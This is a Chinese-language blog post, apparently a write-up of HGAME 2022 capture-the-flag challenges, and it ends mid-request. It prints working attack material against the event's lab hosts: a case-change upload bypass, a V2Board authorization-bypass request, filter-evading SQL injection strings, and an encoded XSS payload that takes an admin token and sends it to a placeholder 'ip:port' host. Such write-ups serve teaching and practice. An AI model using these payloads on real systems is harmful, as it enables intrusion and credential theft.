<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="2022HGAME-Web-Wp" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* ç®­å¤´çš„é¢œè‰² */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* è¾¹æ¡†çš„é¢œè‰² */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* é¼ æ ‡æ»‘è¿‡çš„ç®­å¤´é¢œè‰² */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* è®¾ç½®æ»šåŠ¨æ¡æ‹–åŠ¨å—çš„é¢œè‰² */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">ä¸€åˆ‡éƒ½æ˜¯å…´è¶£ä½¿ç„¶</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            2022HGAME-Web-Wp
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-Classic-Childhood-Game"><span class="post-toc-text">Week1-Classic Childhood Game</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-Guess-Who-I-Am"><span class="post-toc-text">Week1-Guess Who I Am</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-Show-Me-Your-Beaut"><span class="post-toc-text">Week1-Show Me Your Beaut</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-Become-A-Member"><span class="post-toc-text">Week1-Become A Member</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week2-Git-Leakage"><span class="post-toc-text">Week2-Git Leakage</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week2-v2board"><span class="post-toc-text">Week2-v2board</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week2-Search-Commodity"><span class="post-toc-text">Week2-Search Commodity</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week2-Designer"><span class="post-toc-text">Week2-Designer</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week3-Ping-To-The-Host"><span class="post-toc-text">Week3-Ping To The Host</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week3-Login-To-Get-My-Gift"><span class="post-toc-text">Week3-Login To Get My Gift</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week3-Gopher-Shop"><span class="post-toc-text">Week3-Gopher Shop</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week4-Shared-Diary"><span class="post-toc-text">Week4-Shared Diary</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week4-Tell-Me"><span class="post-toc-text">Week4-Tell Me</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn"><span class="post-toc-text">Pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-test-nc"><span class="post-toc-text">Week1-test_nc</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Week1-RSA"><span class="post-toc-text">Week1-RSA</span></a></li></ol></li></ol>
            
        
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Week1-Classic-Childhood-Game"><a href="#Week1-Classic-Childhood-Game" class="headerlink" title="Week1-Classic Childhood Game"></a>Week1-Classic Childhood Game</h2><p>ä¸€ä¸ªé­”å¡”çš„æ¸¸æˆï¼ˆç«¥å¹´çš„ä¼šè®®ï¼‰</p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œåœ¨Events.jsé‡Œæœç´¢å…³é”®å­—â€œé€šå…³â€ï¼Œå¯ä»¥å‘ç°åœ¨4ä¸ªé€šè¿‡äº‹ä»¶ä¸‹é¢éƒ½ä¼šæ‰§è¡Œ<code>mota()</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301061551218.png" alt="image-20230106155105177"></p>
<p>ç›´æ¥åœ¨æ§åˆ¶å°æ‰§è¡Œ<code>mota()</code>ï¼Œå¾—åˆ°flag</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301061551881.png" alt="image-20230106155137832"></p>
<h2 id="Week1-Guess-Who-I-Am"><a href="#Week1-Guess-Who-I-Am" class="headerlink" title="Week1-Guess Who I Am"></a>Week1-Guess Who I Am</h2><p>è„šæœ¬é¢˜</p>
<p>åœ¨æºç é‡Œæœ‰hintè·å¾—æ•°æ®é›†</p>
<p>æ‰¾åˆ°ä»–æ€ä¹ˆè·å¾—é¢˜ç›®å’Œè·å¾—åˆ†æ•°çš„æ¥å£ï¼Œç„¶åå†™è„šæœ¬</p>
<p>å› ä¸ºåœ¨requestsè®¿é—®å¾—åˆ°çš„ç»“æœé‡Œ<code>&lt; &gt; &amp;</code>ä¼šè¢«unicodeç¼–ç ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œåˆ¤æ–­çš„æ—¶å€™æ›¿æ¢ä¸€ä¸‹</p>
<p>exp</p>
<pre><code class="py">import requests
list=[
    &#123;
        &quot;id&quot;: &quot;ba1van4&quot;,
        &quot;intro&quot;: &quot;21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰&quot;,
        
        &quot;url&quot;: &quot;https://ba1van4.icu&quot;
    &#125;,
    &#123;
        &quot;id&quot;: &quot;yolande&quot;,
        &quot;intro&quot;: &quot;21çº§ / éå¸¸èœçš„å¯†ç æ‰‹ / å¾ˆæ‡’çš„æ‘¸é±¼çˆ±å¥½è€…ï¼Œæœ‰ç‚¹å‘†ï¼Œæƒ³å­¦ç‚¹åˆ«çš„ä½†æ˜¯ä¸€ç›´å¼€æ‘†&quot;,
        
        &quot;url&quot;: &quot;https://y01and3.github.io/&quot;
    &#125;,
    ..........,
    ..........
]
sess=requests.session()
for i in range(101):
    url=&quot;http://week-1.hgame.lwsec.cn:31653/api/getQuestion&quot;
    res=sess.get(url)
    print(res.text)
    for x in list:
        if x.get(&#39;intro&#39;) in res.text.replace(&#39;\\u0026&#39;,&#39;&amp;&#39;).replace(&#39;\\u003c&#39;,&#39;&lt;&#39;).replace(&#39;\\u003e&#39;,&#39;&gt;&#39;):
            print(x.get(&#39;id&#39;),x.get(&#39;intro&#39;))
            url2=&quot;http://week-1.hgame.lwsec.cn:31653/api/verifyAnswer&quot;
            res2=sess.post(url2,data=&#123;&quot;id&quot;:x.get(&#39;id&#39;)&#125;)
            print(res2.text)
            url3=&quot;http://week-1.hgame.lwsec.cn:31653/api/getScore&quot;
            print(sess.get(url3).text)
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301061653540.png" alt="image-20230106165353460"></p>
<h2 id="Week1-Show-Me-Your-Beaut"><a href="#Week1-Show-Me-Your-Beaut" class="headerlink" title="Week1-Show Me Your Beaut"></a>Week1-Show Me Your Beaut</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œè¿‡æ»¤äº†phpç­‰ï¼Œ</p>
<p>ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œ<code>3.PhP</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301061707734.png" alt="image-20230106170731662"></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301061707035.png" alt="image-20230106170743976"></p>
<h2 id="Week1-Become-A-Member"><a href="#Week1-Become-A-Member" class="headerlink" title="Week1-Become A Member"></a>Week1-Become A Member</h2><p>æœ‰ç‚¹å°æ— è¯­</p>
<ul>
<li><p>è¯·å…ˆæä¾›ä¸€ä¸‹èº«ä»½è¯æ˜ï¼ˆCute-Bunnyï¼‰å“¦</p>
<p>è®¾ç½®httpå¤´ï¼Œ<code>User-Agent: Cute-Bunny</code></p>
</li>
<li><p>æ¯ä¸€ä¸ªèƒ½å¤Ÿæˆä¸ºä¼šå‘˜çš„é¡¾å®¢ä»¬éƒ½åº”è¯¥æŒæœ‰åä¸ºVidarçš„é‚€è¯·ç ï¼ˆcodeï¼‰</p>
<p>è®¾ç½®httpå¤´ï¼Œ<code>Cookie: code=Vidar;</code></p>
</li>
<li><p>ç”±äºç‰¹æ®ŠåŸå› ï¼Œæˆ‘ä»¬åªæ¥æ”¶æ¥è‡ªäºbunnybunnybunny.comçš„ä¼šå‘˜èµ„æ ¼ç”³è¯·</p>
<p>è®¾ç½®httpå¤´ï¼Œ<code>Referer:bunnybunnybunny.com</code></p>
</li>
<li><p>å°±å·®æœ€åä¸€ä¸ªæœ¬åœ°çš„è¯·æ±‚ï¼Œå°±èƒ½æ‹¿åˆ°ä¼šå‘˜è´¦å·å•¦</p>
<p>è®¾ç½®httpå¤´ï¼Œ<code>X-Forwarded-For: 127.0.0.1</code></p>
</li>
<li><p>username:luckytoday password:happy123ï¼ˆè¯·ä»¥jsonè¯·æ±‚æ–¹å¼ç™»é™†ï¼‰</p>
<p>æ•°æ®åŒ…ï¼š</p>
<pre><code>GET / HTTP/1.1
Host: week-1.hgame.lwsec.cn:31764
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cute-Bunny
Referer:bunnybunnybunny.com
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: code=Vidar;
Connection: close
Content-Length: 51

&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;
</code></pre>
</li>
</ul>
<h2 id="Week2-Git-Leakage"><a href="#Week2-Git-Leakage" class="headerlink" title="Week2-Git Leakage"></a>Week2-Git Leakage</h2><p>å°±æ˜¯ä¸ªgitæ³„éœ²ï¼Œä½¿ç”¨Githack github:<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p> ç„¶ååœ¨å¾—åˆ°çš„æ–‡ä»¶å¤¹å†…å¾—åˆ°flag</p>
<h2 id="Week2-v2board"><a href="#Week2-v2board" class="headerlink" title="Week2-v2board"></a>Week2-v2board</h2><p>ä¸€ä¸ªv2boardçš„è¶Šæƒè®¿é—®æ¼æ´</p>
<p>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="http://wiki.peiqi.tech/wiki/webapp/V2Board/V2Board%20Admin.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html">V2Board Admin.php è¶Šæƒè®¿é—®æ¼æ´</a></p>
<p>æ³¨å†Œä¸ªè´¦æˆ·ç™»å½•ä¹‹åï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨adminçš„apiæ¥å£</p>
<p>æ•°æ®åŒ…</p>
<pre><code class="bash">GET /api/v1/admin/user/fetch HTTP/1.1
Host: week-2.hgame.lwsec.cn:32149
Pragma: no-cache
Cache-Control: no-cache
authorization: MTIzNDU2QHFxLmNvbTokMnkkMTAkTEJDYVBPNklGbTdKU2l5c2J3bGlDTzVkVjhvMzlULm9OWTRWejd2WTAxaU91c3BiMmNhNHk=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Language: zh-CN
Accept: */*
Referer: http://week-2.hgame.lwsec.cn:32149/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.1.338645386.1673702436; _ga_P1E9Z5LRRK=GS1.1.1673702435.1.1.1673703462.0.0.0
Connection: close
</code></pre>
<h2 id="Week2-Search-Commodity"><a href="#Week2-Search-Commodity" class="headerlink" title="Week2-Search Commodity"></a>Week2-Search Commodity</h2><p>æœ‰ç‚¹ææˆ‘å¿ƒæ€ï¼Œå› ä¸ºæ˜¾é”™ä½é€‰é”™äº†ï¼Œç»“æœæ•´äº†åŠå¤© XDï¼Œçˆ†ä¸å‡ºå­—æ®µåï¼Œè¿˜å¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥ï¼Œä½†æ˜¯é‡ç‚¹å°±æ˜¯é€‰å¯¹æ˜¾é”™ä½ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p>
<hr>
<p>å…ˆæ˜¯ä¸ªå¼±å¯†ç ï¼Œuser01&#x2F;admin123</p>
<p>ç„¶åå°±æ˜¯ä¸ªè”åˆæ³¨å…¥ï¼Œåªä¸è¿‡è¿‡æ»¤äº†äº›ä¸œè¥¿ï¼Œå‘åƒunionï¼Œandï¼Œorï¼Œ&#x3D;ï¼Œç©ºæ ¼ï¼Œdatabaseç­‰</p>
<p>å…³é”®å­—å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡</p>
<p>&#x3D;ç”¨likeæ›¿ä»£</p>
<p>ç©ºæ ¼ä½¿ç”¨%0cæ›¿ä»£</p>
<p>åœ¨è”åˆæŸ¥è¯¢æ—¶ï¼Œinformationè¦ä½¿ç”¨infoorrmationï¼Œå› ä¸ºåœ¨åç«¯orä¼šè¢«æ›¿æ¢ä¸ºç©º</p>
<p>è¿™é‡Œé€‰æ‹©æ˜¾é”™ä½è¦é€‰æ‹©ä¸­é—´çš„é‚£ä¸ªï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªæ˜¾é”™ä½çš„æ•°æ®ç±»å‹å¯èƒ½ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œå¯¼è‡´è¯»ä¸å‡ºæ•°æ®</p>
<p>payload:</p>
<p>çˆ†åº“åï¼š</p>
<pre><code class="bash">search_id=0%0cUnion%0cSelect%0c1,Database(),1
</code></pre>
<p>å¾—åˆ°<code>se4rch</code></p>
<p>çˆ†è¡¨åï¼š</p>
<pre><code class="bash">search_id=0%0cUnion%0cSelect%0c1,Group_concat(table_name),1%0cFrom%0cinfoorrmation_schema.tables%0cWhere%0ctable_schema%0clike%0c&#39;se4rch&#39;
</code></pre>
<p>å¾—åˆ°<code>5ecret15here,L1st,user1nf0</code></p>
<p>çˆ†5ecret15hereçš„å­—æ®µ</p>
<pre><code class="bash">search_id=0%0cUnion%0cSelect%0c1,Group_concat(column_name),1%0cFrom%0cinfoorrmation_schema.columns%0cWhere%0ctable_schema%0clike%0c&#39;se4rch&#39;%0cAnd%0ctable_name%0clike%0c&#39;5ecret15here&#39;
</code></pre>
<p>å¾—åˆ°<code>f14gggg1shere</code></p>
<p>è·å–flag</p>
<pre><code class="bash">search_id=0%0cUnion%0cSelect%0c1,f14gggg1shere,1%0cFrom%0c5ecret15here
</code></pre>
<p>å¾—åˆ°flag:<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code></p>
<h2 id="Week2-Designer"><a href="#Week2-Designer" class="headerlink" title="Week2-Designer"></a>Week2-Designer</h2><p>å› ä¸ºä¹‹å‰ä¸ç†Ÿæ‚‰ï¼Œæ‰€ä»¥åšäº†æŒºä¹…XD</p>
<p>å‚è€ƒè¿æ¥:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest">XHRæ–‡æ¡£</a></li>
<li><a target="_blank" rel="noopener" href="http://www.saucer-man.com/information_security/103.html">æ¢ç´¢XSSåˆ©ç”¨ç¼–ç ç»•è¿‡çš„åŸç†</a></li>
<li><a target="_blank" rel="noopener" href="https://jwt.io/">JWTè§£ç </a></li>
</ul>
<hr>
<p>åˆ©ç”¨XHR (XMLHttpRequest)è¿›è¡Œssrfï¼Œè·å¾—tokenï¼Œç„¶åå†å¤–å¸¦å‡ºæ¥</p>
<p>æŸ¥çœ‹ä»£ç é‡Œçš„å…³é”®å†…å®¹</p>
<pre><code class="js">app.post(&quot;/user/register&quot;, (req, res) =&gt; &#123;
  const username = req.body.username
  let flag = &quot;hgame&#123;fake_flag_here&#125;&quot;
  if (username == &quot;admin&quot; &amp;&amp; req.ip == &quot;127.0.0.1&quot; || req.ip == &quot;::ffff:127.0.0.1&quot;) &#123;
    flag = &quot;hgame&#123;true_flag_here&#125;&quot;
  &#125;
  const token = jwt.sign(&#123; username, flag &#125;, secret)
  res.json(&#123; token &#125;)
&#125;)
</code></pre>
<p>è¿™é‡Œæ˜¯åªæœ‰æœ¬åœ°è®¿é—®ï¼Œä¸”username&#x3D;adminæ‰ä¼šè¿”å›å­˜åœ¨flagçš„jsonæ ¼å¼çš„token</p>
<pre><code class="js">app.post(&quot;/button/share&quot;, auth, async (req, res) =&gt; &#123;
  const browser = await puppeteer.launch(&#123;
    headless: true,
    executablePath: &quot;/usr/bin/chromium&quot;,
    args: [&#39;--no-sandbox&#39;]
  &#125;);
  const page = await browser.newPage()
  const query = querystring.encode(req.body) //å°†jsonæ ¼å¼çš„è½¬æ¢ä¸ºé”®=å€¼
  await page.goto(&#39;http://127.0.0.1:9090/button/preview?&#39; + query)
  await page.evaluate(() =&gt; &#123;
    return localStorage.setItem(&quot;token&quot;, &quot;jwt_token_here&quot;)
  &#125;)
  await page.click(&quot;#button&quot;)

  res.json(&#123; msg: &quot;admin will see it later&quot; &#125;)
&#125;)
</code></pre>
<p>&#x2F;button&#x2F;shareè·¯ç”±å¯ä»¥è®©adminå»è®¿é—®&#x2F;button&#x2F;previewè·¯ç”±</p>
<pre><code class="js">app.get(&quot;/button/preview&quot;, (req, res) =&gt; &#123;
  const blacklist = [
    /on/i, /localStorage/i, /alert/i, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/
  ]
  for (const key in req.query) &#123;
    console.log(key)
    for (const item of blacklist) &#123;
      console.log(req.query[key])
      if (item.test(key.trim()) || item.test(req.query[key].trim())) &#123;
        req.query[key] = &quot;&quot;
      &#125;
    &#125;
  &#125;
  res.render(&quot;preview&quot;, &#123; data: req.query &#125;)
&#125;)
</code></pre>
<p>&#x2F;button&#x2F;previewè·¯ç”±å¯ä»¥è¿›è¡Œé¢„è§ˆç”Ÿæˆçš„å›¾æ ‡ï¼ŒåŒæ—¶å¯ä»¥è¿›è¡Œxssï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨htmlç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="http://www.saucer-man.com/information_security/103.html">æ¢ç´¢XSSåˆ©ç”¨ç¼–ç ç»•è¿‡çš„åŸç†</a></p>
<pre><code class="html">&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&lt;/script&gt;
</code></pre>
<p>è¿™æ ·å¯ä»¥è§¦å‘alertï¼Œå‰é¢çš„<code>&lt;svg&gt;</code>æ˜¯å¿…é¡»çš„</p>
<p>ç„¶åå°±æ˜¯çœ‹xhrè¯·æ±‚ï¼Œå¯ä»¥registerè¿”å›çš„å€¼æ˜¯jsonæ ¼å¼ï¼Œæ‰€ä»¥è¦è§£æJSON</p>
<p>è¿˜æœ‰ä¸€äº›é—­åˆå•¥çš„å°±ä¸è¯´äº†</p>
<p>å…·ä½“payload</p>
<pre><code class="html">&quot;&gt;&lt;svg&gt;&lt;script&gt;let data = new FormData();data.append(&quot;username&quot;, &quot;admin&quot;);let xhr = new XMLHttpRequest();xhr.open(&quot;POST&quot;, &quot;/user/register&quot;, true);xhr.onload=function()&#123;a=JSON.parse(this.responseText);xhr.open(&quot;GET&quot;,&quot;http://ip:port/&quot;+a.token);xhr.send();&#125;;xhr.send(data);&lt;/script&gt;
</code></pre>
<p>å› ä¸ºæ²¡æœ‰è¿‡æ»¤scriptå’Œsvgï¼Œæ‰€ä»¥åªç”¨æŠŠä¸­é—´çš„å†…å®¹è¿›è¡Œç¼–ç å°±è¡Œ</p>
<p>è‡ªå·±å†™äº†ä¸ªè„šæœ¬</p>
<pre><code class="python">import urllib.parse
def string2hex(str):
    result=&#39;&#39;
    for i in str:
        result+=&#39;&amp;#x&#39;+hex(ord(i))[2:]+&#39;;&#39;
    print((&#39;[+] Convert_to_htmlencode_is:&#123;&#125;&#39;).format(result))
    return  result
def tourlencode(str):
    result=urllib.parse.quote(str)
    print(&#39;[+]=&gt;Convert_to_urlencode_is:&#123;&#125;&#39;.format(result))


if __name__==&#39;__main__&#39;:
    str=input(&#39;code:&#39;)
    a = string2hex(str)
    x = input(&quot;urlencode?: &quot;)
    if x==&#39;1&#39;:
     tourlencode(a)
</code></pre>
<p>ç„¶åæ•°æ®åŒ…å†…å®¹</p>
<pre><code>POST /button/share HTTP/1.1
Host: week-2.hgame.lwsec.cn:32081
Content-Length: 1757
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsImZsYWciOiJoZ2FtZXtmYWtlX2ZsYWdfaGVyZX0iLCJpYXQiOjE2NzQxMjk1NDh9.WmukQwq_iTqggkh46HSio-6OrFS2vwZpR8rfqAhruSY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://week-2.hgame.lwsec.cn:32081
Referer: http://week-2.hgame.lwsec.cn:32081/button/edit
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.1.338645386.1673702436; _ga_P1E9Z5LRRK=GS1.1.1673702435.1.1.1673705290.0.0.0; SESSION=MTY3MzcwNTgxMHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT184QW4c0XVHi565shIgRL0YX6ATYfkdUxOsEPm50J6Qs0=
Connection: close

&#123;&quot;border-radius&quot;:&quot;0px&quot;,&quot;background-color&quot;:&quot;#000000&quot;,&quot;color&quot;:&quot;#000000&quot;,&quot;border-width&quot;:&quot;1px&quot;,&quot;box-shadow&quot;:&quot;3px 3px #000&quot;,
&quot;xss&quot;:&quot;\&quot;&gt;&lt;svg&gt;&lt;script&gt;&amp;#x6c;&amp;#x65;&amp;#x74;&amp;#x20;&amp;#x64;&amp;#x61;&amp;#x74;&amp;#x61;&amp;#x20;&amp;#x3d;&amp;#x20;&amp;#x6e;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x46;&amp;#x6f;&amp;#x72;&amp;#x6d;&amp;#x44;&amp;#x61;&amp;#x74;&amp;#x61;&amp;#x28;&amp;#x29;&amp;#x3b;&amp;#x64;&amp;#x61;&amp;#x74;&amp;#x61;&amp;#x2e;&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x28;&amp;#x22;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x6e;&amp;#x61;&amp;#x6d;&amp;#x65;&amp;#x22;&amp;#x2c;&amp;#x20;&amp;#x22;&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x22;&amp;#x29;&amp;#x3b;&amp;#x6c;&amp;#x65;&amp;#x74;&amp;#x20;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x20;&amp;#x3d;&amp;#x20;&amp;#x6e;&amp;#x65;&amp;#x77;&amp;#x20;&amp;#x58;&amp;#x4d;&amp;#x4c;&amp;#x48;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x52;&amp;#x65;&amp;#x71;&amp;#x75;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x28;&amp;#x29;&amp;#x3b;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x2e;&amp;#x6f;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x28;&amp;#x22;&amp;#x50;&amp;#x4f;&amp;#x53;&amp;#x54;&amp;#x22;&amp;#x2c;&amp;#x20;&amp;#x22;&amp;#x2f;&amp;#x75;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x2f;&amp;#x72;&amp;#x65;&amp;#x67;&amp;#x69;&amp;#x73;&amp;#x74;&amp;#x65;&amp;#x72;&amp;#x22;&amp;#x2c;&amp;#x20;&amp;#x74;&amp;#x72;&amp;#x75;&amp;#x65;&amp;#x29;&amp;#x3b;&amp;#x78;&amp;#x68;&amp;#x72;&amp;#x2e;&amp;#x6f;&amp;#x6e;&amp;#x6c;&amp;#x6f;&amp;#x61;&amp;#x64;&amp;#x3d;&amp;#x66;&amp;#x75;&amp;#x6e;&amp;#x63;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x28;&amp;#x29;&amp;#x7b;&amp;#x61;&amp;#x3d;&amp;#x4a;&amp;#x53;&amp;#x4f;&amp;#x4e;&amp;#x2e;&amp;#x70;&amp;#x61;&amp;#x72;&amp;#x73;&a